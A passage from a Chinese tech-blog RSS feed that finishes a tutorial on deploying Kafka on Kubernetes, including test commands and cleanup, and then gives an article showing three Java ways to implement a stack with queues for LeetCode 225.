&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202011/485422-20201103083710827-2023077677.png&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;7. 再打开一个窗口，执行命令消费消息：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-shell&quot;&gt;./kafka-console-consumer.sh --bootstrap-server 192.168.50.135:31090 --topic test001 --from-beginning
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202011/485422-20201103083711212-1681562210.png&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;8. 再打开一个窗口，执行命令查看消费者group：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-shell&quot;&gt;./kafka-consumer-groups.sh --bootstrap-server 192.168.50.135:31090 --list
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;如下图可见groupid等于&lt;span&gt;console-consumer-21022&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202011/485422-20201103083711534-1039923807.png&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;9. 执行命令查看groupid等于console-consumer-21022的消费情况：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-shell&quot;&gt;./kafka-consumer-groups.sh --group console-consumer-21022 --describe --bootstrap-server 192.168.50.135:31090
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;如下图所示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202011/485422-20201103083712039-1521174490.png&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;远程连接kafka体验基本功能完毕，查看、收发消息都正常，证明本次部署成功；&lt;/p&gt;
&lt;h3 id=&quot;kafkacat连接&quot;&gt;kafkacat连接&lt;/h3&gt;
&lt;ol&gt;&lt;li&gt;kafkacat是个客户端工具，我这里是在MacBook Pro上用brew安装的；&lt;/li&gt;
&lt;li&gt;我这里K8S服务器IP是&lt;span&gt;192.168.50.135&lt;/span&gt;，因此执行此命令查看kafka信息：&lt;span&gt;kafkacat -b 192.168.50.135:31090 -L&lt;/span&gt;，如下图，可以看到broker信息，以及topic信息(一个是test001，还有一个是consumer的offset)，把端口换成&lt;span&gt;31091&lt;/span&gt;和&lt;span&gt;31092&lt;/span&gt;会连接到另外两个broker，也能得到相同信息：&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/485422/202011/485422-20201103083712660-711308510.png&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;清理资源&quot;&gt;清理资源&lt;/h3&gt;
&lt;p&gt;本次实战创建了很多资源：rbac、role、serviceaccount、pod、deployment、service，下面的脚本可以将这些资源清理掉(只剩NFS的文件没有被清理掉)：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-shell&quot;&gt;helm del --purge kafka
kubectl delete service zookeeper-nodeport -n kafka-test
kubectl delete storageclass managed-nfs-storage
kubectl delete deployment nfs-client-provisioner -n kafka-test
kubectl delete clusterrolebinding run-nfs-client-provisioner
kubectl delete serviceaccount nfs-client-provisioner -n kafka-test
kubectl delete role leader-locking-nfs-client-provisioner -n kafka-test
kubectl delete rolebinding leader-locking-nfs-client-provisioner -n kafka-test
kubectl delete clusterrole nfs-client-provisioner-runner
kubectl delete namespace kafka-test
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;至此，K8S环境部署和验证kafka的实战就完成了，希望能给您提供一些参考；&lt;/p&gt;
&lt;h3 id=&quot;欢迎关注公众号：程序员欣宸&quot;&gt;欢迎关注公众号：程序员欣宸&lt;/h3&gt;
&lt;blockquote readability=&quot;4.258064516129&quot;&gt;
&lt;p&gt;微信搜索「程序员欣宸」，我是欣宸，期待与您一同畅游Java世界...&lt;br/&gt;&lt;a href=&quot;https://github.com/zq2599/blog_demos&quot;&gt;https://github.com/zq2599/blog_demos&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
</description>
<pubDate>Tue, 03 Nov 2020 00:37:00 +0000</pubDate>
<dc:creator>程序员欣宸</dc:creator>
<og:description>欢迎访问我的GitHub https://github.com/zq2599/blog_demos 内容：所有原创文章分类汇总及配套源码，涉及Java、Docker、Kubernetes、DevOPS</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/bolingcavalry/p/13917562.html</dc:identifier>
</item>
<item>
<title>队列实现栈的3种方法，全都击败了100%的用户！ - Java中文社群</title>
<link>http://www.cnblogs.com/vipstone/p/13917552.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/vipstone/p/13917552.html</guid>
<description>&lt;blockquote readability=&quot;3.021978021978&quot;&gt;
&lt;p&gt;本文已收录至 Github《小白学算法》系列：&lt;a href=&quot;https://github.com/vipstone/algorith&quot;&gt;https://github.com/vipstone/algorith&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;之前我们讲过&lt;a href=&quot;https://mp.weixin.qq.com/s/18GdYCCaaltx4ZMVkPsptg&quot;&gt;《用两个栈实现一个队列》&lt;/a&gt;，而今天我们要讲的是「用队列实现栈」，它们都属于常见的面试题，而我们今天要用多种方法来实现队列到栈的“转变”。&lt;/p&gt;
&lt;p&gt;老规矩，先来回顾一下栈（Stack）和队列（Queue）的特性和常见方法。&lt;/p&gt;
&lt;p&gt;栈是后进先出（LIFO）的数据结构，常见方法如下：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;push()：入栈方法，向栈顶添加元素；&lt;/li&gt;
&lt;li&gt;pop()：出栈方法，将栈顶的元素移除并返回元素；&lt;/li&gt;
&lt;li&gt;peek()：查询栈顶元素，并不会移除元素。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/png/92791/1603245618507-fd1ccb93-45a8-4562-a754-ecd185bdf164.png#align=left&amp;amp;display=inline&amp;amp;height=233&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=466&amp;amp;originWidth=324&amp;amp;size=12982&amp;amp;status=done&amp;amp;style=none&amp;amp;width=162&quot; alt=&quot;image.png&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;队列是先进先出（FIFO）的数据结构，常见方法如下：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;offer()：入队方法，向队尾添加元素；&lt;/li&gt;
&lt;li&gt;poll()：出队方法，从队头移除并返回元素；&lt;/li&gt;
&lt;li&gt;peek()：查询队头元素，并不会移除元素。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/png/92791/1603165315591-fbecf9ff-c45f-489b-b050-1c30f4c29e4b.png#align=left&amp;amp;display=inline&amp;amp;height=150&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=300&amp;amp;originWidth=992&amp;amp;size=17929&amp;amp;status=done&amp;amp;style=none&amp;amp;width=496&quot; alt=&quot;image.png&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;知道了这些基础内容之后，就来看今天的问题吧。&lt;/p&gt;
&lt;h2 id=&quot;题目描述&quot;&gt;题目描述&lt;/h2&gt;
&lt;p&gt;使用队列实现栈的下列操作：&lt;/p&gt;
&lt;blockquote readability=&quot;11&quot;&gt;
&lt;p&gt;push(x) -- 元素 x 入栈&lt;/p&gt;
&lt;p&gt;pop() -- 移除栈顶元素&lt;/p&gt;
&lt;p&gt;top() -- 获取栈顶元素&lt;/p&gt;
&lt;p&gt;empty() -- 返回栈是否为空&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;注意:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;你只能使用队列的基本操作-- 也就是 push to back, peek/pop from front, size, 和 is empty 这些操作是合法的；&lt;/li&gt;
&lt;li&gt;你所使用的语言也许不支持队列。你可以使用 list 或者 deque（双端队列）来模拟一个队列 , 只要是标准的队列操作即可；&lt;/li&gt;
&lt;li&gt;你可以假设所有操作都是有效的（例如, 对一个空的栈不会调用 pop 或者 top 操作）。&lt;/li&gt;
&lt;/ul&gt;&lt;blockquote readability=&quot;0.97402597402597&quot;&gt;
&lt;p&gt;LeetCode 225：&lt;a href=&quot;https://leetcode-cn.com/problems/implement-stack-using-queues/&quot;&gt;https://leetcode-cn.com/problems/implement-stack-using-queues/&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;题目解析&quot;&gt;题目解析&lt;/h2&gt;
&lt;p&gt;这道题的题目很好理解：&lt;strong&gt;只需要将先进先出的队列，转换为后进先出的“栈”就可以了&lt;/strong&gt;，我们可以从多个方向入手来实现此功能，比如使用两个队列插入并交换的方式，或者是一个队列插入再交换的方式，或双端队列的方式来实现此功能，具体实现方法和代码如下。&lt;/p&gt;
&lt;h4 id=&quot;实现方法-1：两个队列实现栈&quot;&gt;实现方法 1：两个队列实现栈&lt;/h4&gt;
&lt;p&gt;之前我们用两个栈实现了一个队列的文章中，主要使用的是「负负得正」的思想，那么当看到此道题时，首先应该想到的是用两个队列来实现一个栈，但这里的实现思路和用栈实现队列的思路又略有不同，因为队列都是先进先出的，我们可以把它理解为「正数」，那么也就不能用「负负得正」的思想了，&lt;strong&gt;我们这里使用两个队列来实现栈，主要的操作思路是先将元素插入一个临时队列中，然后再将另一个队列的所有元素插入到临时队列的尾部，从而实现后进先出功能的&lt;/strong&gt;，具体的实现步骤如下。&lt;/p&gt;
&lt;h5 id=&quot;步骤一&quot;&gt;步骤一&lt;/h5&gt;
&lt;p&gt;添加首个元素，入列到临时队列 &lt;code&gt;queue2&lt;/code&gt;：&lt;br/&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/png/92791/1603246742345-f9fbb9da-683f-4b42-853a-023c30fd9325.png#align=left&amp;amp;display=inline&amp;amp;height=234&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=468&amp;amp;originWidth=1208&amp;amp;size=26319&amp;amp;status=done&amp;amp;style=none&amp;amp;width=604&quot; alt=&quot;image.png&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h5 id=&quot;步骤二&quot;&gt;步骤二&lt;/h5&gt;
&lt;p&gt;因为正式队列中无元素，因此无需将 &lt;code&gt;queue1&lt;/code&gt; 中的元素移动到临时队列 &lt;code&gt;queue2&lt;/code&gt; 的尾部，直接将临时队列和正式队列互换即可：&lt;br/&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/png/92791/1603246992152-260b3763-2121-4503-815a-8ea39b486b4c.png#align=left&amp;amp;display=inline&amp;amp;height=228&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=456&amp;amp;originWidth=938&amp;amp;size=23549&amp;amp;status=done&amp;amp;style=none&amp;amp;width=469&quot; alt=&quot;image.png&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h5 id=&quot;步骤三&quot;&gt;步骤三&lt;/h5&gt;
&lt;p&gt;添加第二个元素，先入列到临时队列 &lt;code&gt;queue2&lt;/code&gt;：&lt;br/&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/png/92791/1603247195370-a5e1dfca-38c9-4b37-b2c0-77710e14643d.png#align=left&amp;amp;display=inline&amp;amp;height=235&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=470&amp;amp;originWidth=1216&amp;amp;size=28969&amp;amp;status=done&amp;amp;style=none&amp;amp;width=608&quot; alt=&quot;image.png&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h5 id=&quot;步骤四&quot;&gt;步骤四&lt;/h5&gt;
&lt;p&gt;再将 &lt;code&gt;queue1&lt;/code&gt; 中的元素移动到 &lt;code&gt;queue2&lt;/code&gt; 的尾部，如下所示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/png/92791/1603247270274-b139d03d-ea7f-401e-9892-e341f44d2e8a.png#align=left&amp;amp;display=inline&amp;amp;height=229&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=458&amp;amp;originWidth=948&amp;amp;size=25762&amp;amp;status=done&amp;amp;style=none&amp;amp;width=474&quot; alt=&quot;image.png&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h5 id=&quot;步骤五&quot;&gt;步骤五&lt;/h5&gt;
&lt;p&gt;再将 &lt;code&gt;queue1&lt;/code&gt; 和 &lt;code&gt;queue2&lt;/code&gt; 进行互换：&lt;br/&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/png/92791/1603247472204-525f905e-82b5-4c7f-a370-f4b563bbc1c0.png#align=left&amp;amp;display=inline&amp;amp;height=458&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=916&amp;amp;originWidth=944&amp;amp;size=50282&amp;amp;status=done&amp;amp;style=none&amp;amp;width=472&quot; alt=&quot;image.png&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h5 id=&quot;步骤六&quot;&gt;步骤六&lt;/h5&gt;
&lt;p&gt;执行出队操作：&lt;br/&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/png/92791/1603247579029-fa50d171-a02d-4549-8c4e-06529820b2d6.png#align=left&amp;amp;display=inline&amp;amp;height=191&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=382&amp;amp;originWidth=928&amp;amp;size=18106&amp;amp;status=done&amp;amp;style=none&amp;amp;width=464&quot; alt=&quot;image.png&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/png/92791/1603247629995-9b799ced-a17d-4806-9bea-e4a85f8418a3.png#align=left&amp;amp;display=inline&amp;amp;height=186&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=372&amp;amp;originWidth=940&amp;amp;size=18312&amp;amp;status=done&amp;amp;style=none&amp;amp;width=470&quot; alt=&quot;image.png&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h5 id=&quot;最终效果&quot;&gt;最终效果&lt;/h5&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/png/92791/1603247747418-f1300850-2c94-4064-971d-1fc1770def51.png#align=left&amp;amp;display=inline&amp;amp;height=153&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=306&amp;amp;originWidth=510&amp;amp;size=13119&amp;amp;status=done&amp;amp;style=none&amp;amp;width=255&quot; alt=&quot;image.png&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;从最终的效果图我们可以看出，通过两个队列已经实现了后进先出的特性，也就是完成了从队列到栈的转换，实现代码如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;import java.util.Queue;

class MyStack {

    Queue&amp;lt;Integer&amp;gt; queue1;
    Queue&amp;lt;Integer&amp;gt; queue2;

    public MyStack() {
        queue1 = new LinkedBlockingQueue();
        queue2 = new LinkedBlockingQueue();
    }

    /**
     * 入栈
     */
    public void push(int x) {
        // 1.入列临时队列二
        queue2.offer(x);
        // 2.将队列一的所有元素移动到队列二
        while (!queue1.isEmpty()) {
            queue2.offer(queue1.poll());
        }
        // 3.队列一和队列二互换
        Queue&amp;lt;Integer&amp;gt; temp = queue1;
        queue1 = queue2;
        queue2 = temp;
    }

    /**
     * 出栈并返回此元素
     */
    public int pop() {
        return queue1.poll();
    }

    /**
     * 查询栈顶元素
     */
    public int top() {
        return queue1.peek();
    }

    /**
     * 判断是否为空
     */
    public boolean empty() {
        return queue1.isEmpty();
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;我们在 LeetCode 中提交以上测试代码，执行结果如下：&lt;br/&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/png/92791/1603189021221-af3f6da5-4cde-422c-8ccf-e0509e1c8d9b.png#align=left&amp;amp;display=inline&amp;amp;height=277&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=554&amp;amp;originWidth=1820&amp;amp;size=63239&amp;amp;status=done&amp;amp;style=none&amp;amp;width=910&quot; alt=&quot;image.png&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;此方法很稳，竟然击败了 100% 的用户。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&quot;实现方法-2：一个队列实现栈&quot;&gt;实现方法 2：一个队列实现栈&lt;/h4&gt;
&lt;p&gt;那我们可以不可以用一个队列来实现栈呢？答案是肯定的。&lt;/p&gt;
&lt;p&gt;我们只需要执行以下两个步骤就可以实现将队列转换为栈了，具体实现步骤如下：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;将元素入列到队尾；&lt;/li&gt;
&lt;li&gt;再将除队尾之外的所有元素移除并重写入列。&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;这样操作之后，最后进入的队尾元素反而变成了队头元素，也就实现了后进先出的功能了，如下图所示。&lt;/p&gt;
&lt;h5 id=&quot;步骤一-2&quot;&gt;步骤一&lt;/h5&gt;
&lt;p&gt;元素 1 入列：&lt;br/&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/png/92791/1603251900446-5c604bd4-8840-4ee4-8b23-1969ffabca17.png#align=left&amp;amp;display=inline&amp;amp;height=102&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=204&amp;amp;originWidth=1142&amp;amp;size=11396&amp;amp;status=done&amp;amp;style=none&amp;amp;width=571&quot; alt=&quot;image.png&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h5 id=&quot;步骤二-2&quot;&gt;步骤二&lt;/h5&gt;
&lt;p&gt;元素 2 入列：&lt;br/&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/png/92791/1603251935813-4d66ca0a-5731-40b9-83df-5f15fb12f404.png#align=left&amp;amp;display=inline&amp;amp;height=110&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=220&amp;amp;originWidth=1124&amp;amp;size=12620&amp;amp;status=done&amp;amp;style=none&amp;amp;width=562&quot; alt=&quot;image.png&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h5 id=&quot;步骤三-2&quot;&gt;步骤三&lt;/h5&gt;
&lt;p&gt;将最后一个元素之前的所有元素，也就是元素 1，出列重新入列：&lt;br/&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/png/92791/1603252066969-47790e24-7fcb-499d-89b0-faeb63c5a0ee.png#align=left&amp;amp;display=inline&amp;amp;height=128&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=256&amp;amp;originWidth=956&amp;amp;size=14222&amp;amp;status=done&amp;amp;style=none&amp;amp;width=478&quot; alt=&quot;image.png&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/png/92791/1603252103797-b8c70b34-4a87-4c05-838a-f965d86817e8.png#align=left&amp;amp;display=inline&amp;amp;height=115&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=230&amp;amp;originWidth=894&amp;amp;size=9293&amp;amp;status=done&amp;amp;style=none&amp;amp;width=447&quot; alt=&quot;image.png&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h5 id=&quot;步骤四-2&quot;&gt;步骤四&lt;/h5&gt;
&lt;p&gt;执行出队操作：&lt;br/&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/png/92791/1603261674410-5bebef17-22a1-4ef4-a27b-e3e62c46bc96.png#align=left&amp;amp;display=inline&amp;amp;height=368&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=736&amp;amp;originWidth=938&amp;amp;size=30599&amp;amp;status=done&amp;amp;style=none&amp;amp;width=469&quot; alt=&quot;image.png&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h5 id=&quot;最终效果-2&quot;&gt;最终效果&lt;/h5&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/png/92791/1603247747418-f1300850-2c94-4064-971d-1fc1770def51.png#align=left&amp;amp;display=inline&amp;amp;height=153&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=306&amp;amp;originWidth=510&amp;amp;size=13119&amp;amp;status=done&amp;amp;style=none&amp;amp;width=255&quot; alt=&quot;image.png&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;以上思路的实现代码如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;import java.util.Queue;

class MyStack {
    Queue&amp;lt;Integer&amp;gt; queue1;

    public MyStack() {
        queue1 = new LinkedBlockingQueue();
    }

    /**
     * 入栈
     */
    public void push(int x) {
        // 获取原队列长度（要移动的次数）
        int count = queue1.size();
        // 将元素放入队尾
        queue1.offer(x);
        // 将除最后一个元素外，其他的元素重新入队
        for (int i = 0; i &amp;lt; count; i++) {
            System.out.println(&quot;for&quot;);
            queue1.offer(queue1.poll());
        }
    }

    /**
     * 出栈并返回此元素
     */
    public int pop() {
        return queue1.poll();
    }

    /**
     * 查询栈顶元素
     */
    public int top() {
        return queue1.peek();
    }

    /**
     * 判断是否为空
     */
    public boolean empty() {
        return queue1.isEmpty();
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;我们把以上代码在 LeetCode 中提交，执行结果如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/png/92791/1603261818324-f2a1aa82-fad5-4515-82cc-6a519daf79e1.png#align=left&amp;amp;display=inline&amp;amp;height=285&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=570&amp;amp;originWidth=1840&amp;amp;size=65192&amp;amp;status=done&amp;amp;style=none&amp;amp;width=920&quot; alt=&quot;image.png&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;此方法依旧很稳，也是同样的击败了 100% 的用户，只不过此方法在内存方面有更好的表现。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&quot;实现方法-3：双端队列实现栈&quot;&gt;实现方法 3：双端队列实现栈&lt;/h4&gt;
&lt;p&gt;如果觉得以上方法比较难的话，最后我们还有一个更简单的实现方法，我们可以使用 Java 中的双端队列 &lt;code&gt;ArrayDeque&lt;/code&gt; 来实现将元素可以插入队头或队尾，同样移除也是，那么这样我们就可以从队尾入再从队尾出，从而就实现了栈的功能了。&lt;/p&gt;
&lt;p&gt;双端队列结构如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/png/92791/1604231434122-42d9ad14-2f5c-415b-90b0-557c797d241f.png#align=left&amp;amp;display=inline&amp;amp;height=105&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=210&amp;amp;originWidth=1268&amp;amp;size=20325&amp;amp;status=done&amp;amp;style=none&amp;amp;width=634&quot; alt=&quot;image.png&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;我们来演示一下用双端队列实现栈的具体步骤。&lt;/p&gt;
&lt;h5 id=&quot;步骤一-3&quot;&gt;步骤一&lt;/h5&gt;
&lt;p&gt;元素 1 入队：&lt;br/&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/png/92791/1603273703233-6b9f889e-2328-4da4-a461-82853876338f.png#align=left&amp;amp;display=inline&amp;amp;height=121&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=242&amp;amp;originWidth=1124&amp;amp;size=11760&amp;amp;status=done&amp;amp;style=none&amp;amp;width=562&quot; alt=&quot;image.png&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h5 id=&quot;步骤二-3&quot;&gt;步骤二&lt;/h5&gt;
&lt;p&gt;元素 2 入队（队尾）：&lt;br/&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/png/92791/1603273755136-552ee80c-363e-4cf4-9a36-0c346a116394.png#align=left&amp;amp;display=inline&amp;amp;height=128&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=256&amp;amp;originWidth=1126&amp;amp;size=13935&amp;amp;status=done&amp;amp;style=none&amp;amp;width=563&quot; alt=&quot;image.png&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h5 id=&quot;步骤三-3&quot;&gt;步骤三&lt;/h5&gt;
&lt;p&gt;再从队尾出队：&lt;br/&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/png/92791/1603273823886-11702b6e-999d-4ba7-9751-e83d8fa98fea.png#align=left&amp;amp;display=inline&amp;amp;height=162&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=324&amp;amp;originWidth=930&amp;amp;size=14985&amp;amp;status=done&amp;amp;style=none&amp;amp;width=465&quot; alt=&quot;image.png&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/png/92791/1603273906569-142d4d6f-abbe-41a6-8d49-5f40fa095cb0.png#align=left&amp;amp;display=inline&amp;amp;height=159&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=318&amp;amp;originWidth=934&amp;amp;size=13808&amp;amp;status=done&amp;amp;style=none&amp;amp;width=467&quot; alt=&quot;image.png&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h5 id=&quot;最终效果-3&quot;&gt;最终效果&lt;/h5&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/png/92791/1603247747418-f1300850-2c94-4064-971d-1fc1770def51.png#align=left&amp;amp;display=inline&amp;amp;height=153&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=306&amp;amp;originWidth=510&amp;amp;size=13119&amp;amp;status=done&amp;amp;style=none&amp;amp;width=255&quot; alt=&quot;image.png&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;以上思路的实现代码如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;import java.util.ArrayDeque;

class MyStack {
    ArrayDeque&amp;lt;Integer&amp;gt; deque;

    public MyStack() {
        deque = new ArrayDeque&amp;lt;&amp;gt;();
    }

    /**
     * 入栈
     */
    public void push(int x) {
        deque.offer(x);
    }

    /**
     * 出栈并返回此元素
     */
    public int pop() {
        return deque.pollLast();
    }

    /**
     * 查询栈顶元素
     */
    public int top() {
        return empty() ? -1 : deque.peekLast();
    }

    /**
     * 判断是否为空
     */
    public boolean empty() {
        return deque.isEmpty();
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;我们把以上代码在 LeetCode 中提交，执行结果如下：&lt;br/&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/png/92791/1603185663219-61ab47a2-6db8-4725-8212-079967641958.png#align=left&amp;amp;display=inline&amp;amp;height=287&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=574&amp;amp;originWidth=1842&amp;amp;size=66000&amp;amp;status=done&amp;amp;style=none&amp;amp;width=921&quot; alt=&quot;image.png&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;总结&quot;&gt;总结&lt;/h2&gt;
&lt;p&gt;本文我们用 3 种方法实现了将队列转换为栈，其中最简单的方法是用 Java 中自带的双端队列 &lt;code&gt;ArrayDeque&lt;/code&gt; 从队尾入并从队尾出就实现了栈 ，其他两个方法使用的是普通队列，通过入队之后再移动元素到入队元素之后的方法，从而实现了栈的功能。&lt;/p&gt;
&lt;p&gt;小伙伴们，你学会了吗？&lt;/p&gt;
</description>
<pubDate>Tue, 03 Nov 2020 00:34:00 +0000</pubDate>
<dc:creator>Java中文社群</dc:creator>
<og:description>本文已收录至 Github《小白学算法》系列：https://github.com/vipstone/algorith 之前我们讲过《用两个栈实现一个队列》，而今天我们要讲的是「用队列实现栈」，它们都</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/vipstone/p/13917552.html</dc:identifier>
</item>
<item>
<title>机器学习 第4篇：sklearn 最邻近算法概述 - 悦光阴</title>
<link>http://www.cnblogs.com/ljhdo/p/13909887.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/ljhdo/p/13909887.html</guid>
